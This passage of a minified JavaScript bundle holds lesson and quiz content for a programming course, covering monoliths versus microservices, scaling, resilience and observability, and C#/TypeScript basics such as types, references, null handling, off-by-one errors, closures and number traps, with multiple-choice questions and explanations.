architecture, because the services share one platform"],answer:0,why:"The main benefit of microservices is deploying and changing them independently. A shared database and releases that must happen together remove that benefit. But the network and operations costs stay."},{id:"architecture.monolith-microservices.3",kind:"compare",difficulty:"hard",prompt:"40 developers in 5 teams work on one app. Search gets 50× more traffic than everything else, and teams keep blocking each other on releases. Which direction fits better?",choices:["Keep one deployable with one shared release for all 5 teams","Create a few separate services by team and business area, search first"],answer:1,why:"Now there are real reasons to split: teams block each other, and one part needs to scale alone. Split a few services along clear boundaries, not 50 tiny ones."},{id:"architecture.monolith-microservices.4",kind:"perf",difficulty:"medium",prompt:"After splitting a monolith into services, the product page now calls 8 services one after another. It went from 80 ms to 900 ms. Most likely cause?",choices:["The JSON responses became bigger and take longer to parse","Each service runs on a slower CPU than the old monolith did","The database lost its indexes when the tables were split up","Network calls: each one adds latency, and they run one by one"],answer:3,why:"In-process calls cost microseconds. Network calls cost milliseconds each, plus serialization time. Eight calls in a row add a lot of time. Call in parallel where possible, or rethink the boundaries.",remember:"Every service boundary is a network call."}]},{id:"architecture.scaling",title:"Scaling: up, out and stateless",summary:"Bigger server or more servers — and what breaks.",minutes:5,blocks:[{type:"text",text:`**Vertical scaling (scale up)** = a bigger machine.
**Horizontal scaling (scale out)** = more machines behind a load balancer.`},{type:"compare",left:{title:"Scale up",items:["No code changes","Still one simple server","Has a size limit and gets expensive","One server = one point of failure"]},right:{title:"Scale out",items:["Add servers as traffic grows","One server dies, others continue","The app must be stateless","More parts that can break"]}},{type:"diagram",text:`            ┌─► API #1 ─┐
Users ─► LB ┼─► API #2 ─┼─► DB / Redis
            └─► API #3 ─┘
LB = load balancer: spreads requests and
skips servers that fail their health check`},{type:"text",text:"**Stateless** means the server keeps nothing important in its own memory between requests. Request 1 may go to API #1, request 2 to API #3. Sessions, carts and uploaded files must live in a shared place: database, Redis, blob storage."},{type:"example",title:"A common bug",text:"Login works, then the user is randomly logged out. The session was stored in memory on API #1. The next request went to API #2, which never saw it."},{type:"text",text:`**Caching** keeps a nearby copy of results that are slow or expensive to get. Trade-off: the copy can be **stale** (old). Decide how old is OK: prices maybe seconds, product descriptions maybe hours.
An in-memory cache is per server — 3 servers = 3 separate copies. A shared cache (like Redis) gives one copy, but adds a network call.`},{type:"text",text:"**Queues** help too. Put slow work (emails, PDFs) on a queue and answer the user fast. Background workers do the slow work later. (More in Distributed Systems.)"}],remember:"Scale out needs stateless servers. A cache gives speed, but its data may be old.",questions:[{id:"architecture.scaling.1",kind:"debug",difficulty:"medium",prompt:"You go from 1 to 3 API servers behind a load balancer. Now users are randomly logged out and their carts are sometimes empty. Cause?",choices:["The load balancer removes the login cookie from some requests","Sessions and carts are in server memory; requests hit other servers","Three servers open too many connections for one database","The users' browsers block cookies that come from more than one server"],answer:1,why:"With one server, in-memory state always worked. With three, the next request may go to a server that does not have it. Move the state to a shared store (DB, Redis).",remember:"Scale out → keep state out of server memory."},{id:"architecture.scaling.2",kind:"scenario",difficulty:"easy",prompt:"Black Friday is in 2 weeks; traffic will be about 5×. The app is stateless, runs on 2 servers, and the database can handle more load. What is the simplest step?",choices:["Rewrite the app as microservices so each part can scale alone","Move to a faster database engine before the traffic arrives","Add more app servers behind the load balancer, then load test","Turn off all logging to free CPU for the extra traffic"],answer:2,why:"A stateless app scales out easily: add servers. A load test tells you if it really holds 5× and where the next bottleneck is."},{id:"architecture.scaling.3",kind:"debug",difficulty:"hard",prompt:"Prices are cached in `IMemoryCache` for 10 minutes on each of 4 servers. An admin changes a price. For a few minutes, users see the old and new price switch back and forth when they refresh. Why?",choices:["The database returns old and new rows while the update commits","`IMemoryCache` is not thread-safe, so reads can return mixed values","The browser cache mixes the old and new price on each refresh","Each server has its own copy, and they expire at different times"],answer:3,why:"Each server cached the price at a different moment. Until every copy expires, the load balancer sends users to servers with old or new data. Use a shared cache or remove the key on update."},{id:"architecture.scaling.4",kind:"compare",difficulty:"medium",prompt:"An admin dashboard used by 5 people runs on one small VM. Once a month a big report pushes CPU to 100%. Which first move fits better?",choices:["Use a bigger VM, or make the report query cheaper","Rebuild it to run on 10 servers with Redis and a load balancer"],answer:0,why:"Five users and one heavy report do not need a scale-out design. Scaling up or fixing the report is cheap and quick. Scale out when you really need it."}]},{id:"architecture.resilience",title:"Resilience and observability",summary:"Expect failure, and be able to see it.",minutes:5,blocks:[{type:"text",text:`In production things **will** fail: a slow database, a payment API that is down, a full disk.
**Resilience** = the system keeps working, maybe with fewer features, when one part fails.`},{type:"diagram",text:`Recommendations API slow (30 s)
  ↓  no timeout
Every product page request waits 30 s
  ↓
Threads and connections all busy
  ↓
Login and search stop too 💥
(one slow part stopped everything)`},{type:"list",items:["**Timeouts** — never wait forever. `HttpClient` waits 100 seconds by default; most calls should stop waiting much sooner.","**Circuit breaker** — after many failures, stop calling the broken service for a while. Fail fast, so that many requests do not wait at the same time.","**Fallback** — a simpler answer when a part fails. Recommendations down? Show the page without them.","**Bulkhead** — limit how many connections one dependency can use. Then one slow part cannot block the whole system. (The name comes from the walls inside a ship that stop water from spreading.)"]},{type:"text",text:"**Observability** = can you understand what the system is doing from the outside? Three main signals:"},{type:"list",items:['**Logs** — what happened to one thing. "Order 512 failed: card declined."',"**Metrics** — numbers over time. Error rate 4%, p99 1.2 s, CPU 70%.",'**Traces** — one request across services, with the time of each step. "The DB call took 900 ms of the 1 s."']},{type:"text",text:"Trade-off: every resilience tool adds complexity, and every signal costs money (storage, tools). Start with timeouts, health checks and basic metrics. Add more where failures really hurt."}],remember:"Expect failure: timeouts, fallbacks, circuit breakers. Logs say what, metrics say how much, traces say where.",questions:[{id:"architecture.resilience.1",kind:"debug",difficulty:"hard",prompt:"The recommendations service becomes slow. Minutes later the whole website, including login, stops responding. Calls to recommendations have no timeout. What happened?",choices:["Login secretly calls the recommendations service on every sign-in","Waiting requests grew and used all shared threads and connections","The load balancer crashed on its own at the same time, by chance","The slow service sent back bad data that crashed the login code"],answer:1,why:"Without a timeout, every request that touches recommendations waits a long time. They hold threads and connections, so even unrelated requests like login cannot get them. This is a **cascading failure**: one failure causes more failures, like falling dominoes.",remember:"No timeout = one slow dependency can stop everything."},{id:"architecture.resilience.2",kind:"scenario",difficulty:"easy",prompt:"The product page shows recommendations from another service. That service is down. What should the product page do?",choices:["Show an error page to the user","Retry forever until the service is back","Redirect the user to the home page","Show the product without recommendations"],answer:3,why:"Recommendations are only an extra. The product itself is what matters. This is called **graceful degradation**: the main job keeps working when an extra part fails."},{id:"architecture.resilience.3",kind:"mcq",difficulty:"medium",prompt:"One request is slow, and it passes through 4 services. Which signal shows best **where** the time is spent?",choices:["The logs of the API gateway only","The CPU metric of one server","A distributed trace of that request","The overall error rate metric"],answer:2,why:"A trace records each step of one request with its duration, across services. You can see at once which call took 900 ms."},{id:"architecture.resilience.4",kind:"scenario",difficulty:"hard",prompt:"The payment API has failed every call for 3 minutes. Each checkout still waits 10 s for the timeout before it fails. What helps users and the system most?",choices:["A circuit breaker: fail fast for a while, then try again","Raise the timeout to 60 s so calls have more time","Remove the timeout completely","Add more log lines around the payment call"],answer:0,why:"When a service is clearly down, waiting 10 s per request only wastes resources and users' time. A circuit breaker fails fast. Later, it lets one test call go through to see if the service is back."}]}],cheatSheet:[{title:"Design basics",items:[{term:"Coupling",meaning:"How much parts depend on each other — keep it low"},{term:"Cohesion",meaning:"How well code in one part belongs together — keep it high"},{term:"SOLID",meaning:"Five design questions, not laws"},{term:"Abstraction",meaning:"Has a cost — add it only when it is worth it"},{term:"Another module's tables",meaning:"Its internals — use its API instead"}]},{title:"Dependency injection (.NET)",items:[{term:"Constructor injection",meaning:"Ask for dependencies; do not `new` them"},{term:"Singleton",meaning:"One per app — must be thread-safe"},{term:"Scoped",meaning:"One per HTTP request — for example DbContext"},{term:"Transient",meaning:"New one every time it is injected"},{term:"Singleton → Scoped",meaning:"Bug: one instance is kept, shared and stale. Use a factory or scope"}]},{title:"Structure",items:[{term:"Layered",meaning:"API → business → data; each calls the one below"},{term:"Clean architecture",meaning:"Domain in the middle, dependencies point inward"},{term:"Modular monolith",meaning:"One deploy, strong modules — a good first choice"},{term:"Microservices",meaning:"Independent deploy and scale — high operations cost"},{term:"Distributed monolith",meaning:"Shared DB or deployed together — microservice costs, no benefits"}]},{title:"Running at scale",items:[{term:"Scale up",meaning:"Bigger machine — simple, but has a size limit"},{term:"Scale out",meaning:"More machines — needs stateless servers"},{term:"Load balancer",meaning:"Spreads requests, skips unhealthy servers"},{term:"Cache",meaning:"Faster, but may be stale; in-memory = per server"},{term:"Timeout / circuit breaker",meaning:"Do not wait forever; fail fast when a service is down"},{term:"Logs / metrics / traces",meaning:"What happened / how much / where the time went"}]}]},m=Object.freeze(Object.defineProperty({__proto__:null,default:d},Symbol.toStringTag,{value:"Module"})),u={id:"basics",title:"Code Basics",emoji:"🔤",tagline:"Variables, types, functions — the ground everything stands on",lessons:[{id:"basics.variables-types",title:"Variables and types",summary:"Every value has a type. Surprises come from hidden conversions.",minutes:4,blocks:[{type:"text",text:`A **variable** is a named box that holds a value.
A **type** says what kind of value it is: a whole number, text, true/false, money.`},{type:"diagram",text:` variable   type      value
┌─────────┬─────────┬─────────┐
│ age     │ int     │ 30      │
│ name    │ string  │ "Lan"   │
│ isVip   │ bool    │ true    │
│ price   │ decimal │ 19.99   │
└─────────┴─────────┴─────────┘
int = whole number, string = text,
bool = true or false`},{type:"text",text:`**Static typing** (C#, TypeScript): the compiler checks types before the program runs. A wrong type is a build error.
**Dynamic typing** (plain JavaScript, Python): types are only checked while the program runs. A wrong type shows up later, in front of a user.`},{type:"code",code:{lang:"csharp",text:`int age = 30;
age = "thirty";    // compile error
var name = "Lan";  // var: the compiler infers
name = 5;          // string -> still an error`}},{type:"text",text:"TypeScript checks types when you build. The types disappear when it runs as JavaScript. Data from a form, a URL or JSON is not checked at run time."},{type:"code",code:{lang:"ts",text:`// input.value is always a string
const qty = input.value;      // "2"
const total = qty + 1;        // "21", not 3
const ok = Number(qty) + 1;   // 3`}},{type:"list",items:['TS: `Number("")` is `0`, not an error.','TS: `Number("12px")` is `NaN` (Not a Number). But `parseInt("12px")` is `12`.','C#: `int.Parse("abc")` throws an exception. `int.TryParse` returns `false` instead.',"C#: `(int)3.9` is `3`. The cast cuts off the decimals. It does not round."]},{type:"example",title:"The 21-item cart",text:'A shop page reads the quantity box. The customer has 2 items and clicks "+1". The cart now says 21 items. The code joined two strings instead of adding two numbers.'}],remember:"Know the type of every value. Convert text input on purpose, and check that it worked.",questions:[{id:"basics.variables-types.1",kind:"code",difficulty:"easy",prompt:"What does this TypeScript print?",code:{lang:"ts",text:`const a = "1";
const b = 1;
console.log(a + b);`},choices:["2","11","Compile error","NaN"],answer:1,why:'When one side of `+` is a string, `+` joins text. So `"1" + 1` is `"11"`. TypeScript allows this, so the compiler does not warn you.',remember:"string + number = string."},{id:"basics.variables-types.2",kind:"compare",difficulty:"medium",prompt:"A C# API reads an age that a user typed in a text box. Which is better?",choices:["`int.Parse(text)` and let any exception crash the request","`int.TryParse(text, out var age)` and return a clear message if it fails"],answer:1,why:"Users type wrong things all the time, so bad input is normal, not exceptional. `TryParse` lets you return a friendly 400 error instead of a 500 error with a stack trace.",remember:"User input → TryParse, then validate."},{id:"basics.variables-types.3",kind:"truefalse",difficulty:"medium",prompt:"In C#, `var x = 5;` makes `x` dynamically typed, so it can hold a string later.",choices:["True","False"],answer:1,why:"`var` only asks the compiler to work out the type. Here `x` is an `int` forever. Assigning a string to it is a compile error."},{id:"basics.variables-types.4",kind:"debug",difficulty:"hard",prompt:"In TypeScript, `[100, 20, 3].sort()` returns `[100, 20, 3]`. Why is it not `[3, 20, 100]`?",choices:["The default sort compares the values as strings","The default sort keeps the array order when it is short","Sort only works on string arrays, so it does nothing here","Sort returns a new array, and the old one was printed"],answer:0,why:'Without a compare function, `sort` turns each value into text. Text "100" comes before "20" because "1" comes before "2". Use `sort((a, b) => a - b)` for numbers.',remember:"Sorting numbers in TS → pass (a, b) => a - b."}]},{id:"basics.value-vs-reference",title:"Value types vs reference types",summary:"Copy the data, or share one object?",minutes:4,blocks:[{type:"text",text:`A **value type** holds the data itself. Copying it copies the data.
A **reference type** holds a reference: the address of an object somewhere in memory. Copying it copies only the address.`},{type:"diagram",text:`Value type: b = a makes a copy
a ┌────┐     b ┌────┐
  │ 5  │       │ 5  │   two boxes
  └────┘       └────┘

Reference type: b = a shares
a ──┐
    ▼
  ┌──────────────┐
  │ Cart         │   one object
  │ Items: 3     │
  └──────────────┘
    ▲
b ──┘
change it through b → a sees it too`},{type:"compare",left:{title:"Copied (value)",items:["C#: `int`, `bool`, `decimal`, `DateTime`","C#: any `struct`","TS: `number`, `string`, `boolean`"]},right:{title:"Shared (reference)",items:["C#: any `class`, arrays, `List<T>`","TS: objects, arrays, `Map`, `Set`","Changes through one name show in all"]}},{type:"code",code:{lang:"csharp",text:`struct PointS { public int X; }
class  PointC { public int X; }

var s1 = new PointS { X = 1 };
var s2 = s1;  s2.X = 9;  // s1.X is still 1

var c1 = new PointC { X = 1 };
var c2 = c1;  c2.X = 9;  // c1.X is now 9`}},{type:"code",code:{lang:"ts",text:`const a = [1, 2, 3];
const b = a;        // same array
b.push(4);
console.log(a);     // [1, 2, 3, 4]

const c = [...a];   // a new copy
c.push(5);          // a is unchanged`}},{type:"text",text:"`const` only stops you from pointing the name at a new value. You can still change the object inside.\nA spread copy like `{ ...order }` is **shallow**: objects inside it are still shared. `structuredClone(order)` makes a deep copy."},{type:"example",title:"Everyone got dark mode",text:"An app keeps one `defaultSettings` object. For a new user, the code does `settings = defaultSettings` and then sets the theme to dark. That changed the shared default object. Now every new user starts in dark mode."}],remember:"Copying a reference does not copy the object. Two names can point to one object.",questions:[{id:"basics.value-vs-reference.1",kind:"code",difficulty:"easy",prompt:"What does this TypeScript print?",code:{lang:"ts",text:`const user = { name: "An" };
const copy = user;
copy.name = "Binh";
console.log(user.name);`},choices:["An","Binh","undefined","Compile error"],answer:1,why:"`copy = user` copies the reference, not the object. Both names point to one object, so the change shows through `user` too."},{id:"basics.value-vs-reference.2",kind:"code",difficulty:"medium",prompt:"What does this C# print?",code:{lang:"csharp",text:`struct Money { public decimal Amount; }

var a = new Money { Amount = 10 };
var b = a;
b.Amount = 50;
Console.WriteLine(a.Amount);`},choices:["50","10","0","Compile error"],answer:1,why:"`Money` is a `struct`, so `b = a` copies the whole value. Changing `b` does not touch `a`. If `Money` were a `class`, it would print 50.",remember:"struct = copied. class = shared."},{id:"basics.value-vs-reference.3",kind:"debug",difficulty:"hard",prompt:"The code makes `const draft = { ...order }` and then calls `draft.items.push(extra)`. Now the original order also has the extra item. Why?",choices:["Spread copies only the top level; `items` is still the same array","Spread does not copy anything; `draft` and `order` are one object","Calling `push` on any copied array always changes the source too","The order was declared with `const`, so the copy cannot be changed"],answer:0,why:"Spread makes a shallow copy. The new object gets the same reference to `items`. Copy the array too, or use `structuredClone`.",remember:"Spread = shallow copy."},{id:"basics.value-vs-reference.4",kind:"scenario",difficulty:"medium",prompt:"A helper `topThree(products)` calls `products.sort(...)` and returns the first three. After it runs, the product table on screen is in a new order. What is the best fix?",choices:["Sort a copy inside the helper: `[...products].sort(...)`","Re-sort the table on screen after every call to the helper","Pass the products as `const` so that sort cannot change them","Tell callers to clone the array before they call the helper"],answer:0,why:"In TS, `sort` changes the array in place, and the caller shares that array. The helper should not change its input. Sort a copy inside it.",remember:"Do not change the objects you are given unless that is the job."}]},{id:"basics.null-undefined",title:"null and undefined",summary:"The value that is not there, and the crashes it causes.",minutes:4,blocks:[{type:"text",text:`**null** means "no value here". Tony Hoare added null references to a language in 1965. He later called it his "billion-dollar mistake".
The problem: any reference might be empty, and the code forgets to check.`},{type:"diagram",text:`customer ──► ┌──────────────┐
             │ Name: "Lan"  │   ok
             └──────────────┘

customer ──► (nothing)
customer.Name  → crash
  C#: NullReferenceException
  TS: TypeError: Cannot read
      properties of null`},{type:"text",text:'TypeScript has two empty values. `undefined` means never set, or a missing property. `null` means set to "nothing" on purpose.'},{type:"code",code:{lang:"csharp",text:`// <Nullable>enable</Nullable> in the .csproj
string  name = "Lan";  // should never be null
string? nick = null;   // may be null

int a = nick.Length;         // warning
int b = nick?.Length ?? 0;   // safe`}},{type:"code",code:{lang:"ts",text:`// "strict": true turns on strictNullChecks
function shout(nick: string | null) {
  return nick.toUpperCase();   // error
}
const city = user.address?.city ?? "Unknown";`}},{type:"list",items:["`a?.b` — if `a` is null or undefined, stop and give back that empty value. No crash.","`x ?? y` — use `y` only when `x` is null or undefined.",'`x || y` — uses `y` also when `x` is `0`, `""` or `false`. This is often a bug.',"C# nullable warnings are checked at build time only. Data from JSON or a database can still be null."]},{type:"example",title:"The 0% discount",text:"A product has a discount of 0. The code says `discount || 10`. Because 0 counts as false, the product gets 10% off. With `discount ?? 10`, 0 stays 0."},{type:"text",text:'**Empty is not null.** `""` is a string with no characters. `null` is no string at all. Pick one meaning for "no phone number" and convert the other at the edge. In C#, `string.IsNullOrWhiteSpace` checks both.'}],remember:'Make "can be missing" visible in the type, and handle it where the value comes in.',questions:[{id:"basics.null-undefined.1",kind:"code",difficulty:"medium",prompt:"What does this TypeScript print?",code:{lang:"ts",text:`const qty = 0;
console.log(qty || 5, qty ?? 5);`},choices:["5 5","0 0","5 0","0 5"],answer:2,why:"`||` treats 0 as false, so it gives 5. `??` only replaces null and undefined, so it keeps 0.",remember:"Default for numbers → use ??, not ||."},{id:"basics.null-undefined.2",kind:"debug",difficulty:"easy",prompt:"A C# job crashes with `NullReferenceException` on `order.Customer.Email`. `order` is not null. What is the most likely cause?",choices:["`Customer` is null for this order, for example not loaded","The `Email` value is too long for the column in the database","The `Email` property is null, so reading it throws the error","The database connection was closed before the line ran"],answer:0,why:"Reading `.Email` crashes only if the object before the dot is null. Here that is `Customer`. A null `Email` itself would not throw until you use it."},{id:"basics.null-undefined.3",kind:"truefalse",difficulty:"medium",prompt:"Once you turn on nullable reference types in C#, a `NullReferenceException` can no longer happen.",choices:["True","False"],answer:1,why:"The feature gives compile-time warnings, not run-time checks. Values from JSON, the database or old code can still be null."},{id:"basics.null-undefined.4",kind:"scenario",difficulty:"medium",prompt:'A `Phone` column has some rows with `NULL` and some with `""`. A report of "customers without a phone" misses half of them. What is the best long-term fix?',choices:['Pick one meaning for "no phone" and convert input to it on save','Check for both NULL and "" in this report and leave the data as is','Store the text "none" in the column for customers with no phone',"Make the column NOT NULL and force users to type a phone number"],answer:0,why:'Two ways to say "missing" means every query must remember both. Normalize at the edge, then clean up the old rows once.',remember:'One meaning for "missing". Convert at the edge.'}]},{id:"basics.control-flow",title:"Control flow and off-by-one",summary:"if, switch, loops — and the bug at the edge of every loop.",minutes:4,blocks:[{type:"text",text:"**Control flow** decides which line runs next. `if` chooses one path. `switch` picks one of many. Loops repeat.\nAn **off-by-one** bug is a loop or range that goes one step too far or stops one step too early."},{type:"diagram",text:`array length = 4
index:  0    1    2    3
      ┌────┬────┬────┬────┐
      │ 10 │ 20 │ 30 │ 40 │
      └────┴────┴────┴────┘
i < 4   → 0, 1, 2, 3       ok
i <= 4  → 0, 1, 2, 3, 4    BUG
          index 4 is outside`},{type:"code",code:{lang:"csharp",text:`var items = new[] { 10, 20, 30, 40 };
for (int i = 0; i <= items.Length; i++)
    Console.WriteLine(items[i]);
// last turn reads items[4]
// → IndexOutOfRangeException`}},{type:"text",text:"In TypeScript, `items[4]` does not crash. It gives `undefined`, and the bug moves somewhere else."},{type:"diagram",text:`Fencepost: a 4 m fence, a post every 1 m

|────|────|────|────|
0    1    2    3    4
4 sections, but 5 posts`},{type:"list",items:["Pages: 101 rows, 10 per page → 11 pages, not 10.","Date ranges: is the end day included? Prefer `>= start` and `< nextDay`.","TS months start at 0: `new Date(2026, 0, 1)` is January 1.","`switch` in TS: a case without `break` also runs the next case. C# does not allow that."]},{type:"example",title:"Hotel nights",text:"A guest checks in on the 10th and leaves on the 14th. That is 4 nights, not 5. Counting days from 10 to 14 with `<=` charges one night too many."},{type:"code",code:{lang:"ts",text:`// Early return: handle special cases first
function shipFee(o: Order): number {
  if (o.items.length === 0) return 0;
  if (o.isVip) return 0;
  if (o.total >= 500_000) return 0;
  return 30_000;
}`}}],remember:'For every loop and range, test the first and the last value. Ask: "is the end included?"',questions:[{id:"basics.control-flow.1",kind:"code",difficulty:"easy",prompt:"How many times does the loop body run?",code:{lang:"csharp",text:`for (int i = 1; i < 5; i++)
    count++;`},choices:["3","4","5","6"],answer:1,why:"`i` takes the values 1, 2, 3 and 4. When `i` is 5, `i < 5` is false and the loop stops."},{id:"basics.control-flow.2",kind:"debug",difficulty:"medium",prompt:"Paid orders are getting refunded. Why?",code:{lang:"ts",text:`switch (status) {
  case "paid":
    sendReceipt();
  case "cancelled":
    refund();
    break;
}`},choices:['The "paid" case has no `break`, so it falls into "cancelled"',"A `switch` on strings compares them by reference, not by value","The `break` at the end stops only the last case from running",'The `status` value is "Paid" with a capital P, so it skips both'],answer:0,why:"In TS a case without `break` (or `return`) keeps running into the next case. So paid orders also call `refund()`. C# would refuse to compile this.",remember:"TS switch: every case ends with break or return."},{id:"basics.control-flow.3",kind:"scenario",difficulty:"medium",prompt:"A booking runs from March 10 (check-in) to March 14 (check-out). The code loops `for (d = 10; d <= 14; d++)` and charges per loop. The guest complains. What is wrong?",choices:["It charges 5 nights; check-out day is not a night, so use `d < 14`","It charges 4 nights; it should include both days and charge 5 nights","It charges 5 nights, which is correct; the guest is simply mistaken","It charges 3 nights; the loop skips both the first and the last day"],answer:0,why:"Days 10 to 14 inclusive are 5 values, but the guest sleeps only 4 nights. The end date is excluded, so the loop needs `<`.",remember:"Ranges: include the start, exclude the end."},{id:"basics.control-flow.4",kind:"compare",difficulty:"medium",prompt:"A function has 4 special cases and 1 main rule. Which shape is easier to read and change?",choices:["Four `if` blocks nested inside each other, with the main rule deep inside","Early returns for the special cases first, then the main rule at the end"],answer:1,why:"Early returns (guard clauses) keep the code flat. Each special case is handled and done. The main rule sits at the end, easy to find."}]},{id:"basics.functions-closures",title:"Functions, scope and closures",summary:"Input, output, what a function can see, and what it remembers.",minutes:5,blocks:[{type:"text",text:`A **function** takes **parameters** (its input), does some work and **returns** a value (its output).
A **pure function** gives the same output for the same input. It also has no **side effects**: no database write, no email, no change to outside variables.`},{type:"compare",left:{title:"Pure",items:["`total(items)` returns a number","Same input → same result","Test with one line, no setup"]},right:{title:"Not pure",items:["Reads the clock or a global","Saves to the database, sends email","Needs mocks or a real DB to test"]}},{type:"text",text:"**Scope** is the part of the code where a name can be seen. Inner code sees outer names. Outer code cannot see inner names."},{type:"diagram",text:`┌ file ───────────────────────────┐
│ const taxRate = 0.1             │
│ ┌ function total(price) ──────┐ │
│ │ const tax = price * taxRate │ │
│ │ ┌ if (vip) ───────────────┐ │ │
│ │ │ const off = 5           │ │ │
│ │ └─────────────────────────┘ │ │
│ │ off is not visible here     │ │
│ └─────────────────────────────┘ │
└─────────────────────────────────┘`},{type:"text",text:"A **closure** is a function that remembers the variables around the place where it was made. It keeps the **variable itself**, not a copy of its value."},{type:"code",code:{lang:"ts",text:`function makeCounter() {
  let count = 0;
  return () => ++count;
}
const next = makeCounter();
next();  // 1
next();  // 2  (count is remembered)`}},{type:"code",code:{lang:"ts",text:`for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);
}
// prints 3, 3, 3: one shared i
// with "let i" it prints 0, 1, 2`}},{type:"code",code:{lang:"csharp",text:`var actions = new List<Action>();
for (int i = 0; i < 3; i++)
    actions.Add(() => Console.WriteLine(i));
foreach (var a in actions) a();
// prints 3, 3, 3: all share one i
// fix: var copy = i; then capture copy`}},{type:"example",title:"Every button deletes the last row",text:'A list builds one "Delete" button per row in a loop. Each click handler captures the loop variable. When a user clicks, the loop is long done. So every button deletes the last row.'}],remember:"A closure captures the variable, not a snapshot of its value.",questions:[{id:"basics.functions-closures.1",kind:"code",difficulty:"hard",prompt:"What does this TypeScript print?",code:{lang:"ts",text:`for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0);
}`},choices:["0 1 2","3 3 3","2 2 2","0 0 0"],answer:1,why:"`var` makes one `i` for the whole loop. The callbacks run after the loop ends, when `i` is 3. With `let`, each turn gets its own `i`.",remember:"Loops in TS → use let, never var."},{id:"basics.functions-closures.2",kind:"mcq",difficulty:"easy",prompt:"Which function is pure?",choices:["`add(a, b)` that returns `a + b`","`now()` that returns the current time","`save(user)` that writes the user to the DB","`next()` that adds 1 to a global counter"],answer:0,why:"`add` depends only on its inputs and changes nothing outside. The others read the clock, write to a database or change shared state."},{id:"basics.functions-closures.3",kind:"compare",difficulty:"medium",prompt:"You must calculate an invoice total, save it and email it. Which design is easier to test?",choices:["One function that calculates, saves to the DB and sends the email","A pure `calcTotal(lines)` function, called by code that saves and emails"],answer:1,why:"The pure part holds the tricky rules. You can test it with plain inputs, no database or mail server. The side effects stay thin and simple.",remember:"Keep the logic pure. Push side effects to the edges."},{id:"basics.functions-closures.4",kind:"debug",difficulty:"hard",prompt:"In C#, a `for (int i = 0; i < 5; i++)` loop runs `tasks.Add(Task.Run(() => Process(ids[i])))`. Some tasks crash with `IndexOutOfRangeException`. Why?",choices:["All lambdas share one `i`; by the time some run, `i` is already 5","`Task.Run` copies `ids` before it starts, so the array is empty","Tasks cannot read local variables, so `i` is reset to its default","The array is read by many threads at once, which is not allowed"],answer:0,why:"The lambda captures the variable `i`, not its value. The loop can finish before a task starts, so it reads `ids[5]`. Copy `i` into a local inside the loop."}]},{id:"basics.number-traps",title:"Number traps",summary:"Overflow, integer division, 0.1 + 0.2, money and rounding.",minutes:5,blocks:[{type:"text",text:"Numbers in a computer have limits. When they break, there is often no error. You just get a wrong answer."},{type:"diagram",text:`C# int = 32 bits
min: -2 147 483 648
max:  2 147 483 647

max + 1 ──► wraps around ──► min
 2 147 483 647 + 1 = -2 147 483 648`},{type:"code",code:{lang:"csharp",text:`int a = int.MaxValue;
int b = a + 1;           // -2147483648
long c = (long)a + 1;    // 2147483648
checked { int d = a + 1; }  // OverflowException`}},{type:"text",text:"**Integer division**: in C#, `int / int` gives an `int`. The decimals are cut off, so `7 / 2` is `3`.\nIn TypeScript every `number` is a floating-point number, so `7 / 2` is `3.5`."},{type:"code",code:{lang:"csharp",text:`int done = 1, total = 3;
double pct = done / total * 100;    // 0
double ok  = done * 100.0 / total;  // 33.33...`}},{type:"diagram",text:`double / TS number = binary fractions
0.1 in binary = 0.000110011001100...
                (never ends, like 1/3)

0.1 + 0.2          → 0.30000000000000004
0.1 + 0.2 === 0.3  → false`},{type:"list",items:["Money in C#: use `decimal`. `0.1m + 0.2m == 0.3m` is true.","Money in TS: store **minor units** as whole numbers, for example cents: `1999` for 19.99 USD.","Money in SQL: use `DECIMAL(18,2)` or similar, never `FLOAT`.","TS whole numbers are exact only up to `Number.MAX_SAFE_INTEGER` (about 9 million billion). Send 64-bit ids as strings."]},{type:"text",text:'**Rounding** has rules too. C# `Math.Round(2.5)` is `2`. It uses **banker\'s rounding**: a half goes to the nearest even number. TS `Math.round(2.5)` is `3`. In C#, pass `MidpointRounding.AwayFromZero` if the business wants "round half up".'},{type:"example",title:"The 1-cent invoice",text:"An invoice rounds each line, then adds them. The accounting system adds first, then rounds once. The totals differ by 1 cent. Ask the business which rule is correct, and use it everywhere."}],remember:"Integers overflow, integer division cuts, floats are close but not exact. Money → decimal or minor units.",questions:[{id:"basics.number-traps.1",kind:"code",difficulty:"easy",prompt:"What does this C# print?",code:{lang:"csharp",text:"Console.WriteLine(7 / 2);"},choices:["3.5","3","4","Compile error"],answer:1,why:"Both values are `int`, so C# does integer division and drops the .5. Write `7 / 2.0` to get 3.5."},{id:"basics.number-traps.2",kind:"code",difficulty:"medium",prompt:"What does this TypeScript print?",code:{lang:"ts",text:"console.log(0.1 + 0.2 === 0.3);"},choices:["true","false","undefined","NaN"],answer:1,why:"0.1 and 0.2 cannot be stored exactly in binary. Their sum is 0.30000000000000004, so the comparison is false.",remember:"Never compare floats with === for money."},{id:"basics.number-traps.3",kind:"scenario",difficulty:"medium",prompt:"You design prices for a shop with a C# backend and a SQL database. How should you store them?",choices:["`double` in C# and `FLOAT` in SQL, which are fast and precise enough","`decimal` in C# and `DECIMAL(18,2)` in SQL, which keep exact values","`string` in both places, then convert it to a number when you need it","`int` holding whole units only, with the decimals rounded off on save"],answer:1,why:"`decimal` stores base-10 values exactly, so 0.10 stays 0.10. `double` adds tiny errors that grow over many invoices.",remember:"Money → decimal, never double."},{id:"basics.number-traps.4",kind:"debug",difficulty:"hard",prompt:"A C# upload service sums file sizes into an `int totalBytes`. After a 3 GB upload, the total is negative. What happened?",choices:["Integer overflow: `int` tops out near 2.1 billion; use `long`","One of the uploaded files reported a negative size to the server","The disk ran out of space, so the server wrote an error code there","The sum ran on many threads at once, and the values got mixed up"],answer:0,why:"3 GB is more than `int.MaxValue` (about 2.1 billion bytes). By default C# does not throw on overflow; the value wraps to a negative number.",remember:"Byte counts, money in minor units, ids → long."},{id:"basics.number-traps.5",kind:"mcq",difficulty:"hard",prompt:"What does C# `Math.Round(2.5)` return by default?",choices:["3","2","2.5","It throws an exception"],answer:1,why:"The default is banker's rounding: a half goes to the nearest even number. So 2.5 → 2 and 3.5 → 4. Use `MidpointRounding.AwayFromZero` to get 3."}]},{id:"basics.text-dates",title:"Text and dates",summary:"Immutable strings, Unicode, comparing text, and time zones.",minutes:5,blocks:[{type:"text",text:'Strings are **immutable**: you cannot change a string. Every "change" creates a new string. The old one stays as it was.'},{type:"code",code:{lang:"csharp",text:`string name = "lan";
name.ToUpper();           // result thrown away
Console.WriteLine(name);  // "lan"
